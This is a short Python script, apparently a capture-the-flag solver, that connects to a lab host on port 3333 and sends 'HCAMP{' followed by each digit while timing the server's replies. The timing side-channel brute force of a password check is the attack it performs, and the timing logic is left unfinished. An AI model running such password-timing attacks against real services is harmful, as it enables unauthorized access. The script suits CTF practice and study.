import socket
import time
import string

def exploit():
    TCP_IP = '192.168.200.190'
    TCP_PORT = 3333
    password = 'HCAMP{'
    strings = "0123456789"
    test_count = 0

    print("[+] Connecting to %s:%d" % (TCP_IP, TCP_PORT))

    #while test_count <= 10:

    for c in strings:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            max_time = 0
            s.connect((TCP_IP, TCP_PORT))
            print(s.recv(1024))
            start_time = time.time()
            password_temp = password + c
            print("send to",password_temp)

            

            s.send(password_temp.encode())

            print(s.recv(1024))
            
            response = s.recv(1024)
            end_time =time.time()
            running_time = end_time - start_time
            print("running_time",running_time)


            if not response:
                print("[-] Connection closed by the server. Reconnecting...")
                #time.sleep(1)
                continue

            test_count += 1

        except socket.error as e:
            print("[-] Socket error occurred:", str(e))
            print("[-] Reconnecting...")
            continue

        finally:
            s.close()

        time.sleep(1)

exploit()

